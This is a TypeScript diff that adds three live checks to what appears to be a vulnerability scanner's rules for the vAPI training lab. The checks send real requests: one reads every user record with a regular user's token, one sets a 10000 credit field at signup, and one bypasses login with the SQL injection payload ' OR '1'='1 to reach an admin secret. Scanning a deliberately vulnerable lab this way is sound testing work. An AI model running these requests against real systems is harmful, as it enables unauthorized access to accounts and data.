@@ -35714,6 +35714,120 @@ const vapiApi4UserExposureLiveOracle: Rule = async (ctx) => {
   };
 };
 
+function vapiBasicAuthToken(username: string, password: string): string {
+  return Buffer.from(`${username}:${password}`).toString("base64");
+}
+
+const vapiApi5BflaLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const username = `thugir_bfla_${Date.now()}`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/vapi/api5/user", ctx.origin).toString();
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 400) return NEGATIVE;
+  const token = vapiBasicAuthToken(username, password);
+  const usersUrl = new URL("/vapi/api5/users", ctx.origin).toString();
+  const usersDoc = await ctx.probe.get(usersUrl, {
+    headers: { "Authorization-Token": token },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (usersDoc.status < 200 || usersDoc.status >= 400) return NEGATIVE;
+  if (!/\[\s*\{/.test(usersDoc.body) || !/"username"\s*:/.test(usersDoc.body)) return NEGATIVE;
+  const flagMatch = usersDoc.body.match(/flag\{api5_[^"]+/i);
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.91,
+    evidence: {
+      createUrl,
+      usersUrl,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      rowCount: (usersDoc.body.match(/"id"\s*:/g) || []).length,
+      note: "vAPI GET /api5/users with regular-user Authorization-Token returns every user record including admin flag — broken function level authorization oracle (API5)"
+    }
+  };
+};
+
+const vapiApi6MassAssignmentLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const username = `thugir_ma6_${Date.now()}`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/vapi/api6/user", ctx.origin).toString();
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password, credit: 10000 }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 400) return NEGATIVE;
+  const token = vapiBasicAuthToken(username, password);
+  const meUrl = new URL("/vapi/api6/user/me", ctx.origin).toString();
+  const meDoc = await ctx.probe.get(meUrl, {
+    headers: { "Authorization-Token": token },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (meDoc.status < 200 || meDoc.status >= 400) return NEGATIVE;
+  if (!/"credit"\s*:\s*"10000"/.test(meDoc.body)) return NEGATIVE;
+  const flagMatch = meDoc.body.match(/flag\{api6_[^"]+/i);
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.92,
+    evidence: {
+      createUrl,
+      meUrl,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: meDoc.body.slice(0, 160).trim(),
+      note: "vAPI POST /api6/user accepts attacker-controlled credit field and GET /api6/user/me returns 10000 credits with flag — mass assignment oracle (API6)"
+    }
+  };
+};
+
+const VAPI_API8_SQLI_PAYLOAD = { username: "' OR '1'='1", password: "' OR '1'='1" };
+
+const vapiApi8SqliLoginLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const loginUrl = new URL("/vapi/api8/user/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify(VAPI_API8_SQLI_PAYLOAD),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 400) return NEGATIVE;
+  if (!/"success"\s*:\s*"true"/i.test(loginDoc.body)) return NEGATIVE;
+  const keyMatch = loginDoc.body.match(/"authkey"\s*:\s*"([^"]{8,})"/);
+  if (!keyMatch) return NEGATIVE;
+  const secretUrl = new URL("/vapi/api8/user/secret", ctx.origin).toString();
+  const secretDoc = await ctx.probe.get(secretUrl, {
+    headers: { "Authorization-Token": keyMatch[1] },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (secretDoc.status < 200 || secretDoc.status >= 400) return NEGATIVE;
+  const flagMatch = secretDoc.body.match(/flag\{api8_[^"]+/i);
+  if (!flagMatch && !/"secret"\s*:/.test(secretDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.92,
+    evidence: {
+      loginUrl,
+      secretUrl,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: secretDoc.body.slice(0, 160).trim(),
+      note: "vAPI POST /api8/user/login accepts SQL injection `' OR '1'='1` bypass and /api8/user/secret dumps admin flag — SQL injection authentication bypass oracle (API8)"
+    }
+  };
+};
+
 // --- Archon engineering knowledge platform — cybersecurity training path --------------
 const CLIENT_ARCHON_TRAINING_RES: { label: string; re: RegExp }[] = [
   {
@@ -37138,6 +37252,9 @@ export const RULES: Record<string, Rule> = {
   vapiApi3CommentBolaLiveOracle,
   vapiApi4OtpBrokenAuthLiveOracle,
   vapiApi4UserExposureLiveOracle,
+  vapiApi5BflaLiveOracle,
+  vapiApi6MassAssignmentLiveOracle,
+  vapiApi8SqliLoginLiveOracle,
   clientSideArchonTrainingEvidence,
   clientSideArchonApiSecurityCurriculumEvidence,
   clientSideOverthewireBanditEvidence,
